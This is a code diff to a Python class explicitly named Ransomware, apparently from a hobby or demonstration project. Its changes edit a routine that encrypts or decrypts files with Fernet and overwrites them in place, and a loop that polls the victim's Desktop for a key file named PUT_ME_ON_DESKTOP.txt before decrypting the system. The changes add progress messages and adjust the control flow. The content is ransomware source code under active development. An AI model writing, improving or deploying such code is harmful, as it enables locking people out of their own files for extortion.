@@ -91,16 +91,18 @@ class Ransomware:
 			print(f"[+] Crypter Object In Use : {self.crypter}")
 			# Encrypt Data
 			if not encrypted :
+				print(f"{file_path} is Being Encrypted ")
 				_data=self.crypter.encrypt(data)
 				print(f"{file_path} Has Been Encrypted ")
 
 			# Decrypt Data
 			else :
+				print(f"{file_path} is Being Decrypted ")
 				_data=self.crypter.decrypt(data)
 				print(f"{file_path} Has Been Decrypted ")
 
-			with open(file_path,'wb') as fp :
-				fp.write(_data)
+		with open(file_path,'wb') as fp :
+			fp.write(_data)
 
 	def crypt_system(self,encrypted=False):
 
@@ -157,16 +159,16 @@ class Ransomware:
 
 	def put_me_on_desktop(self) :
 		#Check if key exists on Desktop
-		while True :
+		flag=True
+		while flag :
 			try :
-				with open(f"{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt",'rb') as f:
+				with open(f"{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt",'r') as f:
 					self.key= f.read()
 					print(f"[+] Read Key From {self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt As {self.key}")
 					self.crypter=Fernet(self.key)
 					print(f"[+] New Cryptor Object Created As : {self.crypter}")
 					self.crypt_system(encrypted=True)
-
-					break
+					flag=False
 			except :
 				pass
 			sleep(10)
